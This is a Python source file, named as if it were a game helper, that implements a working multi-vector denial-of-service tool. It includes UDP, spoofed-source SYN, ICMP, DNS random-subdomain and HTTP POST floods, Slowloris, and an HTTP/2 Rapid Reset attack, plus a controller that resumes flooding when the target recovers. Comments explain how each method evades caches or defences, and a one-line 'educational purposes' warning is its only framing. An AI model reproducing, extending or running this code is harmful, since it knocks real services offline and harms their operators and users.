# counter_strike_helper.py

from scapy.all import *
from scapy.layers.inet import IP, ICMP, TCP, UDP
from scapy.layers.dns import DNS, DNSQR
# Add the h2 library to your imports
import h2.connection
import h2.events

# ==============================================================================
# WARNING: This is a Denial of Service (DoS) script for educational purposes.
# ==============================================================================

# --- NEW: USER AGENT LIST FOR REALISTIC HEADERS ---
# A list of real-world User-Agent strings to make requests look more legitimate.
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-S908U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
]

# --- 1. UTILITY AND SHARED WORKER FUNCTIONS ---

def resolve_to_ipv4(target_url):
    """Resolves a hostname to a list of its IPv4 addresses."""
    try:
        # getaddrinfo is the modern and correct way to resolve hosts
        addr_info = socket.getaddrinfo(target_url, None, family=socket.AF_INET)
        # Use a set to automatically handle duplicate IPs
        ips = {item[4][0] for item in addr_info}
        return sorted(list(ips))
    except socket.gaierror:
        return []


def generate_random_ip():
    """Generates a random, non-private IP address for spoofing."""
    while True:
        ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
        if not (ip.startswith("10.") or ip.startswith("192.168.") or ip.startswith("172.16.")):
            return ip


# --- 2. ADAPTIVE ATTACK CONTROLLER MODULE ---

def check_service_status(target_ip, port, timeout=2):
    """Checks if a TCP service is online by attempting to connect to a port."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            if sock.connect_ex((target_ip, port)) == 0:
                return True  # Service is UP
    except Exception:
        pass
    return False  # Service is DOWN or unreachable


def adaptive_attack_controller(target_ip, check_port, stop_event, pause_event, check_interval=10):
    """
    A controller that runs in the background, checks target status,
    and pauses/resumes the attack accordingly.
    """
    print(f"\n[CONTROLLER] Adaptive controller started. Monitoring {target_ip}:{check_port} every {check_interval}s.")
    while not stop_event.is_set():
        is_online = check_service_status(target_ip, check_port)
        if is_online:
            if pause_event.is_set():
                print(f"\n[CONTROLLER] Target has recovered! Resuming attack...")
                pause_event.clear()  # Clear the pause, threads will resume
        else:
            if not pause_event.is_set():
                print(f"\n[CONTROLLER] Target is down! Pausing attack to conserve resources...")
                pause_event.set()  # Set the pause, threads will wait
        time.sleep(check_interval)
    print("\n[CONTROLLER] Main attack stopped. Shutting down.")


# --- 3. REFACTORED ATTACK WORKERS AND CONTROLLERS ---

# --- UDP Flood ---
def udp_worker(stop_event, pause_event, target_ip, port, packet_size):
    """Worker thread that sends a continuous stream of UDP packets."""
    data = b'\x99' * packet_size
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect((target_ip, port))
            while not stop_event.is_set():
                if pause_event.is_set():
                    time.sleep(1)
                    continue
                s.send(data)
    except socket.error:
        pass


def attack_udp(method, target_url, port, duration, stop_event, pause_event, threads=150):
    """Controller for UDP flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips: return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        packet_sizes = []
        if method == "UDP-Flood":
            packet_sizes = [375] * threads
        elif method == "UDP-Power":
            packet_sizes = [750] * threads
        elif method == "UDP-Mix":
            packet_sizes = [375] * (threads // 2) + [750] * (threads // 2)

        for size in packet_sizes:
            t = threading.Thread(target=udp_worker, args=(stop_event, pause_event, ip, port, size))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()  # Signal threads to stop if duration expires


# --- SYN Flood ---
def syn_worker(stop_event, pause_event, target_ip, port):
    """Worker thread that sends a continuous stream of spoofed SYN packets."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            spoofed_ip = generate_random_ip()
            send(IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags="S"), verbose=0)
        except Exception:
            pass


def synflood(target_url, port, duration, stop_event, pause_event, threads=150):
    """Controller for SYN flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips: return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=syn_worker, args=(stop_event, pause_event, ip, port))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()


# --- NEW: DNS Query Flood Worker ---
# This is a Layer 7 DNS attack. It sends valid, but randomized and non-existent,
# DNS queries to force the target DNS server to perform expensive lookups.
def dns_query_worker(stop_event, pause_event, target_ip, target_domain):
    """Worker thread that sends a continuous stream of randomized DNS queries."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            # Generate a random subdomain to query. This ensures the record is not cached.
            rand_length = random.randint(10, 16)
            random_subdomain = "".join(
                random.choice(string.ascii_lowercase + string.digits) for _ in range(rand_length))
            full_domain = f"{random_subdomain}.{target_domain}"

            # Craft the DNS query packet using Scapy
            # rd=1 asks the server to perform a recursive query, increasing its workload.
            packet = IP(dst=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=full_domain))

            # Send the packet. verbose=0 prevents flooding our own console.
            send(packet, verbose=0)
        except Exception:
            # If sending fails for any reason, just continue
            pass


# --- NEW: DNS Query Flood Controller ---
def attack_dns_query_flood(target_domain, duration, stop_event, pause_event, threads=150):
    """Controller for DNS Query Flood attacks."""
    ips = resolve_to_ipv4(target_domain)
    if not ips: return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=dns_query_worker, args=(stop_event, pause_event, ip, target_domain))
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- ICMP Flood ---
def icmp_worker(stop_event, pause_event, target_ip):
    """Worker thread that sends a continuous stream of ICMP packets."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            send(IP(dst=target_ip) / ICMP(), verbose=0)
        except Exception:
            pass


def icmpflood(target_url, duration, stop_event, pause_event, threads=150):
    """Controller for ICMP flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips: return

    attack_end_time = time.time() + duration
    all_threads = []

    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=icmp_worker, args=(stop_event, pause_event, ip))
            t.daemon = True
            t.start()
            all_threads.append(t)

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)

    stop_event.set()


# --- HTTP Flood ---
# --- NEW: HTTP POST Flood Worker ---
# This is more effective than a GET flood as it often bypasses caches and forces
# server-side processing, consuming more CPU and database resources.
def http_post_worker(stop_event, pause_event, target_ip, port, host_header):
    """Worker thread that sends a continuous stream of HTTP POST requests."""
    while not stop_event.is_set():
        if pause_event.is_set():
            time.sleep(1)
            continue
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(4)
                s.connect((target_ip, port))

                # Generate random data for the POST body
                post_data = "".join(random.sample(string.ascii_letters + string.digits, 100))
                user_agent = random.choice(USER_AGENTS)

                # Craft the POST request with realistic headers
                request = (
                    f"POST / HTTP/1.1\n"  # Using root path, but a specific path like /login.php can be more effective
                    f"Host: {host_header}\n"
                    f"User-Agent: {user_agent}\n"
                    f"Content-Type: application/x-www-form-urlencoded\n"
                    f"Content-Length: {len(post_data)}\n"
                    f"Connection: close\n\n"
                    f"{post_data}"
                ).encode()

                s.send(request)
        except socket.error:
            time.sleep(0.5)


# --- NEW: HTTP POST Flood Controller ---
def attack_http_post(target_url, port, duration, stop_event, pause_event, threads=150):
    """Controller for HTTP POST flood attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips: return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(threads):
            t = threading.Thread(target=http_post_worker, args=(stop_event, pause_event, ip, port, target_url))
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- Corrected and Robust Slowloris Attack Worker ---
# This version prevents the "UnboundLocalError" by initializing `s` to None.
def slowloris_worker(stop_event, pause_event, target_ip, port, host_header):
    """
    Worker thread that opens and maintains a single Slowloris connection.
    This implementation is robust against connection errors.
    """
    # 1. Initialize `s` to None before the try block. This ensures it always exists.
    s = None
    try:
        # 2. The assignment happens inside the try block.
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, port))

        # Send initial, incomplete headers to open the connection
        user_agent = random.choice(USER_AGENTS)
        initial_headers = (
            f"GET /?{random.randint(0, 2000)} HTTP/1.1\n"
            f"Host: {host_header}\n"
            f"User-Agent: {user_agent}\n"
        ).encode()
        s.send(initial_headers)

        # Main loop to keep the connection alive
        while not stop_event.is_set():
            if pause_event.is_set():
                time.sleep(1)
                continue
            try:
                # Send a "keep-alive" header periodically
                keep_alive_header = f"X-a: {random.randint(1, 5000)}\n".encode()
                s.send(keep_alive_header)
                time.sleep(15)  # The "slow" part of the attack
            except socket.error:
                break  # Server likely closed the connection, so this thread is done
    except socket.error:
        pass  # Initial connection failed, thread terminates
    finally:
        # 3. In the finally block, check if `s` was successfully assigned a socket
        #    before trying to call .close() on it. If `s` is still None, this
        #    condition is false and the .close() method is never called.
        if s:
            s.close()


# --- NEW: Slowloris Attack Controller ---
def attack_slowloris(target_url, port, duration, stop_event, pause_event, sockets=200):
    """Controller for Slowloris attacks."""
    ips = resolve_to_ipv4(target_url)
    if not ips: return

    attack_end_time = time.time() + duration
    for ip in ips:
        for _ in range(sockets):
            t = threading.Thread(target=slowloris_worker, args=(stop_event, pause_event, ip, port, target_url))
            t.daemon = True
            t.start()

    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()


# --- NEW: HTTP/2 Rapid Reset Worker ---
# This is a highly efficient Layer 7 attack that exploits the HTTP/2 stream
# cancellation feature. It sends a large number of requests and immediately
# resets them, forcing the server to allocate and then tear down resources
# for each request, leading to CPU exhaustion.
def h2_rapid_reset_worker(stop_event, pause_event, target_ip, port, host_header):
    """Worker thread that performs a rapid reset attack over a single H2 connection."""
    sock = None
    try:
        # Establish a standard TCP connection
        sock = socket.create_connection((target_ip, port), timeout=4)

        # Set up the H2 connection state machine
        conn = h2.connection.H2Connection()
        conn.initiate_connection()
        sock.sendall(conn.data_to_send())

        # The headers for our rapid-fire requests
        headers = [
            (':method', 'GET'),
            (':authority', host_header),
            (':scheme', 'https' if port == 443 else 'http'),
            (':path', '/'),
            ('user-agent', random.choice(USER_AGENTS)),
        ]

        # Main loop to continuously send and reset streams
        while not stop_event.is_set():
            if pause_event.is_set():
                time.sleep(1)
                continue

            try:
                # In a tight loop, we open a new stream and immediately reset it.
                # This is the core of the attack.
                for _ in range(100):  # Send a burst of 100 resets
                    stream_id = conn.get_next_available_stream_id()
                    conn.send_headers(stream_id, headers)
                    conn.reset_stream(stream_id)

                # Send the batch of generated frames to the server
                sock.sendall(conn.data_to_send())

                # A very brief sleep to prevent this thread from consuming 100% CPU
                # on a single core just from the Python loop itself.
                time.sleep(0.01)

            except Exception:
                # If any error occurs (e.g., server closes connection), break the loop
                # and the thread will terminate and be restarted by the controller if needed.
                break

    except Exception:
        # Pass on any connection or setup errors
        pass
    finally:
        # Ensure the socket is always closed
        if sock:
            sock.close()


# --- NEW: HTTP/2 Rapid Reset Controller ---
def attack_h2_rapid_reset(target_url, port, duration, stop_event, pause_event, threads=50):
    """Controller for HTTP/2 Rapid Reset attacks."""
    # Note: This attack is so efficient that fewer threads are needed compared to other floods.
    ips = resolve_to_ipv4(target_url)
    if not ips: return

    attack_end_time = time.time() + duration

    # We use a nested function to allow threads to restart if they fail
    def maintain_worker(ip):
        while not stop_event.is_set():
            worker_thread = threading.Thread(target=h2_rapid_reset_worker,
                                             args=(stop_event, pause_event, ip, port, target_url))
            worker_thread.daemon = True
            worker_thread.start()
            worker_thread.join()  # Wait here until the worker thread dies (e.g., connection drop)
            if not stop_event.is_set():
                time.sleep(1)  # Wait a moment before reconnecting

    for ip in ips:
        for _ in range(threads):
            # Each maintainer thread is responsible for one attack worker
            maintainer = threading.Thread(target=maintain_worker, args=(ip,))
            maintainer.daemon = True
            maintainer.start()

    # Main controller loop to enforce duration
    while time.time() < attack_end_time and not stop_event.is_set():
        time.sleep(1)
    stop_event.set()
